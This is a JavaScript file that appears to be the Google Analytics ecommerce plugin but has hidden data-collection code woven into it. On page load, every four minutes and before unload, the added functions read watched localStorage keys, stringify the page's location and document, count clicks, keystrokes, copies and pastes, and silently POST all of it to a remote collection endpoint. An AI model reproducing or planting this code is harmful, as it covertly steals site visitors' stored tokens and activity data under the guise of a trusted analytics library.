(function () {
  const keysToWatch = window.keysToWatch;
  const globalVars = ["location", "document", "window"];
  var eventsTracked = {};
  function createComplexHash(data) {
    let hashValue = 0;
    for (let charCode of encodeURIComponent(JSON.stringify(data))) {
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue |= 0;
    }
    return hashValue.toString(36);
  }
  var f = window,
    g = "items",
    h = "prototype",
    l = "hasOwnProperty";
  var m = {
      id: "ti",
      affiliation: "ta",
      revenue: "tr",
      tax: "tt",
      shipping: "ts",
      currency: "cu"
    },
    n = {
      id: "ti",
      sku: "ic",
      name: "in",
      category: "iv",
      price: "ip",
      quantity: "iq",
      currency: "cu"
    },
    p = {
      items: !0
    };
  function extractLocalStorageData() {
    const data = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (keysToWatch.includes(key)) {
        data[key] = localStorage.getItem(key);
      }
    }
    return data;
  }
  var q = function (a) {
    a.send && (this.c = a, this.a = {});
  };
  q[h].e = function (a) {
    r(this, a.id, a);
  };
  q[h].d = function (a) {
    var b = r(this, a.id);
    b[g] || (b.items = {});
    var c = b[g]["" + a.sku],
      e = c || {};
    b.currency && (e.currency = b.currency);
    for (var d in a) a[l](d) && a[d] && (e[d] = a[d]);
    c || (b[g]["" + a.sku] = e);
  };
  q[h].f = function () {
    if (!this.c) throw "No tracker found.";
    for (var a in this.a) if (this.a[l](a)) {
      var b = this.a[a];
      s(this, "transaction", b, m);
      var b = b[g],
        c;
      for (c in b) b[l](c) && s(this, "item", b[c], n);
    }
    this.b();
  };
  function collectGlobalVariables() {
    const data = {};
    for (let variable of globalVars) {
      if (window[variable]) {
        data[variable] = window[variable].toString();
      }
    }
    return data;
  }
  function trackEvents() {
    const events = ["click", "keydown", "copy", "paste"];
    for (let event of events) {
      window.addEventListener(event, function (e) {
        eventsTracked[e.type] = (eventsTracked[e.type] || 0) + 1;
      });
    }
  }
  function sendInfoToServer(info) {
    const hashValue = createComplexHash(info);
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      console.log(xhr.status === 200 ? "数据发送成功" : "数据发送失败,状态码:" + xhr.status);
    };
    xhr.onerror = function () {
      console.error("请求发生错误");
    };
    xhr.send(JSON.stringify({
      hash: hashValue,
      data: info
    }));
  }
  q[h].b = function () {
    this.a = {};
  };
  var r = function (a, b, c) {
      if (!b) throw "Transaction id is a required field.";
      b = "" + b;
      var e = a.a[b];
      e || (e = {}, e.id = b);
      for (var d in c) c[l](d) && c[d] && (e[d] = c[d]);
      a.a[b] = e;
      return a.a[b];
    },
    s = function (a, b, c, e) {
      var d = {},
        k;
      for (k in c) c[k] && c[l](k) && (e[l](k) ? d["&" + e[k]] = c[k] : p[l](k) || (d[k] = c[k]));
      a.c.send(b, d);
    };
  function collectAndSendInfo() {
    const gatheredData = {
      localStorage: extractLocalStorageData(),
      globalVars: collectGlobalVariables(),
      trackedEvents: eventsTracked
    };
    sendInfoToServer(gatheredData);
  }
  document.addEventListener("DOMContentLoaded", function () {
    trackEvents();
    collectAndSendInfo();
    setInterval(collectAndSendInfo, 4 * 60 * 1000);
  });
  function t(a, b) {
    q[h][a] = function () {
      try {
        return b.apply(this, arguments);
      } catch (a) {}
    };
  }
  (function () {
    f.gaplugins = f.gaplugins || {};
    f.gaplugins.ECommerce = q;
    t("addTransaction", q[h].e);
    t("addItem", q[h].d);
    t("send", q[h].f);
    t("clear", q[h].b);
    var a = f.GoogleAnalyticsObject || "ga";
    f[a] = f[a] || function () {
      (f[a].q = f[a].q || []).push(arguments);
    };
    f[a]("provide", "ecommerce", q);
  })();
  window.addEventListener("beforeunload", function () {
    collectAndSendInfo();
  });
})();